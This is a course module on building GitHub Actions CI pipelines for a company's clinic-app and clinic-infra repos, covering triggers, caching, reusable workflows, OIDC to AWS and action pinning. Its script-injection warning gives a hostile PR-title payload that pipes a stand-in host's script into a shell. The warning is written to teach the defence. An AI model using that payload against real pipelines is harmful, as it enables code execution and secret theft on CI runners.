CI Pipelines with GitHub Actions

Every change to clinic-app and clinic-infra goes through GitHub Actions before it reaches AWS. This module teaches how a workflow is put together (events, jobs, steps, runners, contexts and expressions), how to make it fast with matrices, caching and concurrency, how to stop copy-pasting YAML across repos with reusable workflows and composite actions, and how to let a pipeline talk to AWS through OIDC with no stored keys. By the end you can write the CI pipeline for booking-api from scratch, keep it under ten minutes, and review a workflow an agent wrote for the security mistakes that matter.

Why it matters in production: the CI pipeline is the most privileged, least reviewed piece of software most teams own. It holds credentials to your AWS accounts, it runs third-party code on every push, and it decides what ships. The classic incidents are boring: an AWS_SECRET_ACCESS_KEY stored as a repo secret that leaked through a fork, a @v3 tag on a popular action that was rewritten to steal tokens, a 40-minute pipeline that teaches everyone to merge without waiting. Each one has a known fix, and this module teaches all of them.
Part I · Workflow anatomy

A workflow is a graph of jobs on throwaway machines

A GitHub Actions workflow is a YAML file in .github/workflows/. An event (a push, a pull request, a schedule) starts a run. The run contains jobs, and each job gets a fresh virtual machine called a runner. Inside a job, steps run in order and share a filesystem. Between jobs, nothing is shared unless you pass it on explicitly. Keep that last sentence in mind: most "it worked in the build job but not in the deploy job" questions come from it.

Events, jobs, steps and runners

Jobs run in parallel by default. You add order with needs:, which turns the jobs into a directed graph. Steps are either a shell command (run:) or an action (uses:), which is a packaged piece of code from a repo such as actions/checkout. Draw the graph before you write the YAML. If two jobs do not need each other's output, they should not be chained.

Here is that graph as YAML: the first real CI workflow for booking-api. It is 30 lines and it is enough to block a broken merge.

clinic-app/.github/workflows/ci.yml 
name: ci
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
permissions:
  contents: read                         # least privilege for GITHUB_TOKEN (Part IV)
jobs:
  lint:
    runs-on: ubuntu-24.04                # pin the image, not ubuntu-latest
    timeout-minutes: 10                  # default is 360: a hung job burns 6 hours
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run lint
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm test -- --ci
  build:
    needs: [lint, test]                  # only build what passed
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v5
      - run: docker build -t booking-api:${{ github.sha }} services/booking-api

Action versions are shown as tags here so the YAML stays readable. In our repos every uses: is pinned to a full commit SHA, for reasons Part IV explains.

Triggers: run on the right events, and only those

The on: block decides when you pay for runner minutes and when you can trust the result. Two rules cover most cases. Run CI on pull_request so the result shows on the PR before merge, and on push to main so the merged commit is built once more. Use paths filters in a monorepo so a README change does not rebuild three images.

EventUse it forWatch out for
pull_requestLint, test, build, terraform plan on every PRFrom forks it gets a read-only token and no secrets. That is a feature
push (main, tags)Build and publish the image of the merged commit, release on v* tagsWithout branch filters it fires on every branch push and doubles your minutes
workflow_dispatchManual runs with typed inputs: rebuild, hotfix, one-off jobsAnyone with write access can run it; validate inputs
scheduleNightly drift checks, weekly dependency scansRuns on the default branch only, in UTC, and can start 10–30 minutes late at busy hours
workflow_callMakes the file a reusable workflow (Part III)Not a trigger on its own; a caller must invoke it
pull_request_targetLabelling or commenting on fork PRsRuns with secrets and a write token in the base repo. Never check out and run the PR's code in it
clinic-app/.github/workflows/booking-api.yml — trigger block 
on:
  pull_request:
    paths:
      - "services/booking-api/**"
      - "packages/shared/**"          # shared code booking-api imports
      - ".github/workflows/booking-api.yml"   # a change to the pipeline must test the pipeline
  push:
    branches: [main]
    paths: ["services/booking-api/**", "packages/shared/**"]
  workflow_dispatch:
    inputs:
      reason: { type: string, required: true }
Path filters and required checks do not mix by default. If a branch ruleset (FN4) requires the booking-api / test check and a PR does not touch that path, the workflow never runs, and the PR waits for ever with "Expected — waiting for status". Fix it with one always-running ci-gate job that is the only required check and reports the result of whatever actually ran.

Contexts and expressions

Anything inside ${{ }} is an expression, evaluated by GitHub before the step reaches the runner. Expressions read from contexts: objects that describe the event, the job and the run. You use them in if: conditions, to name things, and to pass values between steps and jobs.

ContextExampleTypical use
githubgithub.sha, github.ref_name, github.event_nameImage tags, branch conditions
env / varsvars.AWS_REGIONNon-secret config set at org, repo or environment level
secretssecrets.SLACK_WEBHOOKMasked in logs; where they come from is CI3
stepssteps.meta.outputs.tagOutput of an earlier step in the same job
needsneeds.build.outputs.digestOutput of an upstream job
matrix / runnermatrix.node, runner.archMatrix legs, cache keys per architecture

Passing a value from one job to the next takes three hops: a step writes to $GITHUB_OUTPUT, the job maps it to a job output, and the downstream job reads it from needs.

passing the image tag between jobs 
  build:
    runs-on: ubuntu-24.04
    outputs:
      tag: ${{ steps.meta.outputs.tag }}           # hop 2: step output → job output
    steps:
      - id: meta
        run: echo "tag=1.8.${{ github.run_number }}-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # hop 1
  smoke:
    needs: build
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    steps:
      - run: echo "testing ${{ needs.build.outputs.tag }}"    # hop 3
testing 1.8.412-3f9c2ab
Script injection is the expression bug that leaks credentials. run: echo "${{ github.event.pull_request.title }}" pastes the PR title into the shell script before it runs. A title like "; curl evil.sh | sh # executes on your runner. Pass untrusted values through env: and reference them as "$TITLE". The shell then treats them as data, not code.
Part II · Pipeline speed

A slow pipeline is a broken pipeline

When CI takes 30 minutes, people stack PRs, merge on red "because it's flaky", and stop reading failures. Our budget is under 10 minutes from push to green for an application PR, and under 5 for a terraform plan. You reach that with four tools: parallel jobs and matrices, caching, artifacts instead of rebuilding, and cancelling runs nobody will look at.

Matrix builds: one job definition, many legs

A strategy.matrix expands one job into a leg per combination. Use it for things that genuinely vary (Node versions you support, CPU architectures you ship, test shards), not to look thorough. Each leg is a separate runner, so a matrix of 3 × 2 costs six jobs' worth of minutes.

clinic-app/.github/workflows/booking-api.yml — test job 
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    strategy:
      fail-fast: false                    # see every failing leg, not just the first
      matrix:
        node: [22, 24]                    # current LTS and the next one
        shard: [1, 2, 3]                  # split the 1,400 tests three ways
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npx jest --ci --shard=${{ matrix.shard }}/3

On booking-api this took the test job from 9 min 40 s to 3 min 50 s of wall-clock time, at the cost of more total minutes (6 legs × about 3.5 min). Wall-clock time is what developers feel; total minutes is what the bill shows. Shard only once the suite is slow enough to be worth it.

Caching dependencies and Docker layers

Every job starts on a clean VM, so without a cache npm ci downloads the same 400 MB on every run. A cache is a tarball stored by GitHub under a key. Build the key from the lockfile hash, so it changes exactly when dependencies change. Most setup-* actions do this for you with cache: npm. Docker builds need their own cache: BuildKit can store layers in the same GitHub cache with type=gha.

clinic-app/.github/workflows/booking-api.yml — build job 
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          context: services/booking-api
          platforms: linux/arm64            # Graviton in ECS and EKS
          push: false
          load: true
          tags: booking-api:${{ github.sha }}
          cache-from: type=gha,scope=booking-api
          cache-to: type=gha,scope=booking-api,mode=max   # mode=max caches the builder stage too

Cache rules worth knowing: a repo gets 10 GB of cache by default, and GitHub evicts the least recently used entries beyond that. Entries unused for 7 days are removed. A PR can read caches from its base branch, but main cannot read caches a PR wrote, so a poisoned cache from a PR cannot reach your release build. Never cache anything that holds a secret.

Artifacts: hand files to the next job, keep evidence

Cache and artifacts both store files, and people mix them up. A cache is a speed-up that may be missing and must be safe to lose. An artifact is an output of this run: a test report, a coverage file, a terraform plan file that a later job must apply exactly. If losing it would make the pipeline wrong rather than slower, it is an artifact.

CacheArtifact

Concurrency: cancel runs nobody will read

A developer who pushes four commits in ten minutes starts four full runs, and only the last one matters. A concurrency group allows one run per key. On PRs, cancel the older run. On main and anything that changes infrastructure, queue instead: a cancelled half-finished terraform apply leaves a state lock and a half-built change.

top of every clinic-app workflow 
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}   # cancel on PRs, queue on main

On clinic-app this cut monthly Actions minutes by about 30% with no other change. The full timing picture after Part II looks like this:

Part III · Reuse

Write the pipeline once, call it from every repo

Golden Owl runs dozens of client repos with near-identical pipelines. Copy-pasted YAML drifts within weeks: one repo gets the OIDC fix, eleven don't. GitHub gives you two reuse tools at different levels. A reusable workflow is a whole set of jobs that a caller invokes. A composite action is a bundle of steps that runs inside a caller's job. Our platform repo golden-owl/gha-platform holds both, versioned with tags.

Reusable workflows: whole jobs behind a typed interface

A workflow becomes reusable when it declares on: workflow_call with typed inputs, secrets and outputs. The caller uses it as a job with uses: instead of runs-on:. The callee owns the runner choice, the permissions it needs and the steps, so a fix in one place reaches every caller on their next version bump.

golden-owl/gha-platform/.github/workflows/container-ci.yml 
on:
  workflow_call:
    inputs:
      service:      { type: string, required: true }   # e.g. booking-api
      context:      { type: string, required: true }   # e.g. services/booking-api
      node-version: { type: string, default: "22" }
    outputs:
      digest:
        value: ${{ jobs.build.outputs.digest }}
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v5
      - uses: golden-owl/gha-platform/actions/node-setup@v2   # composite action, below
        with: { node-version: "${{ inputs.node-version }}", workdir: "${{ inputs.context }}" }
      - run: npm test -- --ci
        working-directory: ${{ inputs.context }}
  build:
    needs: test
    runs-on: ubuntu-24.04-arm
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v5
      - id: push
        uses: docker/build-push-action@v6
        with: { context: "${{ inputs.context }}", push: false, cache-from: "type=gha,scope=${{ inputs.service }}" }
clinic-app/.github/workflows/booking-api.yml — the whole caller 
jobs:
  ci:
    uses: golden-owl/gha-platform/.github/workflows/container-ci.yml@v2.3.0
    with:
      service: booking-api
      context: services/booking-api
    permissions:
      contents: read
      id-token: write                    # the caller must grant what the callee needs
    secrets: inherit                     # convenient, but passes everything; name secrets explicitly where you can

booking-api, booking-worker and booking-web went from 190 lines of pipeline YAML each to 12 lines each. You can nest reusable workflows up to 10 levels deep and call up to 50 from one run. Two levels is plenty; more becomes impossible to debug.

Composite actions: a named bundle of steps

A composite action is an action.yml with runs.using: composite. It runs on the caller's runner, inside the caller's job, so it can share the checked-out code and environment. Use it for the five steps every job repeats: setup, cache, install, auth. It cannot choose a runner or define jobs.

golden-owl/gha-platform/actions/node-setup/action.yml 
name: node-setup
description: Node toolchain with npm cache and a clean install
inputs:
  node-version: { required: false, default: "22" }
  workdir:      { required: false, default: "." }
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v5
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm
        cache-dependency-path: ${{ inputs.workdir }}/package-lock.json
    - run: npm ci --no-audit --no-fund
      shell: bash                         # every run: step in a composite MUST set shell
      working-directory: ${{ inputs.workdir }}
Reusable workflowComposite action
Unit of reuseOne or more jobsA list of steps
Chooses the runnerYesNo, uses the caller's
SecretsPassed explicitly or inheritOnly what the caller passes as inputs or env
LogsEach job and step visibleCollapsed into one step in the caller's log
Right forThe standard pipeline: test → build → publish, Terraform plan/applySetup bundles, "log in to ECR", "post to Slack"

Versioning the platform repo like a library

Callers reference a reusable workflow by ref. A branch ref (@main) means every merge to the platform repo changes every client pipeline at once, untested. Treat gha-platform as a library: semver tags (v2.3.0), a changelog, a major version for breaking input changes, and Dependabot in each caller to propose bumps.

Score-4 move: give the platform repo its own CI that calls each reusable workflow against a tiny fixture app on every PR. Without it, the first test of a change to container-ci.yml is a client's release.
Part IV · Trust and runners

No stored keys, no floating tags, no more permission than the job needs

A workflow runs code you did not write (every action), on a machine you do not own, with access to your AWS accounts. Three habits keep that safe: short-lived AWS credentials through OIDC, a GITHUB_TOKEN scoped per job, and actions pinned to an immutable commit. Then you choose where the job runs.

GITHUB_TOKEN permissions: read-only by default

Every job receives a GITHUB_TOKEN that can act on the repo. Set the organisation default to read-only, declare permissions: contents: read at the top of each workflow, and grant more only on the job that needs it. A compromised test step then cannot push to main or publish a release.

PermissionGrant it toWhy
contents: readEvery workflow (top level)Checkout needs it; nothing else does by default
id-token: writeOnly jobs that call AWSLets the job request an OIDC token; it grants nothing in GitHub itself
pull-requests: writeThe job that comments a plan or coverage on the PRWrite access to PRs, not to code
contents: writeThe release job onlyCreates tags and releases (CI2)
packages, actions, checks…RarelyIf an agent adds them, ask which step needs them

OIDC to AWS: credentials that expire in an hour

We never store AWS access keys in GitHub. Instead, the job asks GitHub for a signed OIDC token that says exactly who it is (repo, branch, environment), and AWS STS swaps that token for temporary credentials on one IAM role. The role's trust policy is the security boundary: it decides which repos and refs may assume it.

The role and the identity provider live in Terraform in clinic-infra (IA1). Read the sub condition first in every review. It is where the mistakes are.

clinic-infra/accounts/gol-shared/github-oidc.tf 
resource "aws_iam_openid_connect_provider" "github" {
  url            = "https://token.actions.githubusercontent.com"
  client_id_list = ["sts.amazonaws.com"]    # no thumbprint needed: AWS trusts GitHub's CA
}

data "aws_iam_policy_document" "ecr_push_trust" {
  statement {
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"               # exact match: only main of clinic-app may push
      variable = "token.actions.githubusercontent.com:sub"
      values   = ["repo:golden-owl/clinic-app:ref:refs/heads/main"]
    }
  }
}

resource "aws_iam_role" "gha_clinic_app_ecr_push" {
  name                 = "gha-clinic-app-ecr-push"
  assume_role_policy   = data.aws_iam_policy_document.ecr_push_trust.json

Pin third-party actions to a commit SHA

A tag such as @v45 is a movable pointer. In March 2025 the tags of the popular tj-actions/changed-files action were rewritten to a commit that dumped runner memory, including secrets, into public build logs of thousands of repos. Repos pinned to a SHA were not affected. Pin every third-party action to the full 40-character SHA, keep the version in a comment, and let Dependabot raise the bumps. 

# before: a tag anyone with push rights to that repo can move
      - uses: actions/checkout@v4
# after: immutable; the comment is what Dependabot updates alongside the SHA
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
clinic-app/.github/dependabot.yml 
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
    groups:
      actions: { patterns: ["*"] }      # one PR per week for all action bumps, not twelve

Enforce it rather than hope for it: the organisation's Actions policy can require SHA pinning and restrict which actions are allowed at all. Our allow-list is GitHub-owned actions, aws-actions/*, docker/*, hashicorp/* and golden-owl/*. Supply-chain controls for what you build (images, SBOMs, signing) are CI4.

Hosted or self-hosted runners

Start with GitHub-hosted runners. They are clean on every job, patched by GitHub, and include arm64 (ubuntu-24.04-arm) for Graviton builds. Move a workload to self-hosted only for a concrete reason: the job must reach something inside a VPC (a private EKS endpoint, an internal registry), you need hardware the hosted fleet lacks, or your monthly minutes make it cheaper.

OptionRight whenCost of it
GitHub-hosted standardDefault for all app and Terraform CIPer-minute billing; no network path into your VPC
GitHub-hosted larger runnersBig builds, static IPs, Azure private networkingHigher per-minute rate; still no AWS VPC access
Self-hosted, ARC on EKSJobs that must reach private endpoints; high volumeYou own patching, scaling, isolation and the runner's IAM role
Self-hosted, long-lived VMNever for usState and secrets leak between jobs; one bad PR owns the box

When we do self-host, it is Actions Runner Controller (ARC) with runner scale sets on a dedicated node pool in gol-shared: one ephemeral pod per job, scaled to zero when idle, deleted when the job ends. Running ARC well is a platform topic; the EKS side builds on KS5 and KS8.

Never attach a self-hosted runner to a public repo. Anyone can open a PR, and a PR workflow runs their code on your machine, inside your network, with your runner's IAM role. Even on private repos, keep runner roles narrow: the runner's own identity should be able to do almost nothing, and each job should still assume its role through OIDC.

Working with Claude Code

Agents write plausible workflow YAML quickly, and they reproduce the insecure patterns that fill public repos. Give them the constraints up front, and use actionlint and a test branch rather than trusting the first draft. Never give the agent a token that can change org or repo settings.

Pitfalls & pro tips

✗ ubuntu-latest in production pipelines

The label moves to a new OS image on GitHub's schedule, and toolchain versions change with it. Pin ubuntu-24.04 and upgrade on purpose, in a PR.

✗ Rebuilding in every job

If the deploy job runs docker build again, you ship something that was never tested. Build once, pass the digest as a job output, and promote that digest.

✗ Debugging by pushing commits

Twenty "fix ci" commits later the history is noise. Run actionlint locally, use a scratch branch with workflow_dispatch, and re-run with debug logging (ACTIONS_STEP_DEBUG) when you need detail.

✓ One required check per workflow

A final ci-gate job with if: always() that fails when any needed job failed. Branch rules require only it, so renaming a matrix leg never blocks every PR.

✓ Write the job summary

Append Markdown to $GITHUB_STEP_SUMMARY: image tag, digest, test counts, timing. Reviewers read it on the run page instead of scrolling 3,000 log lines.
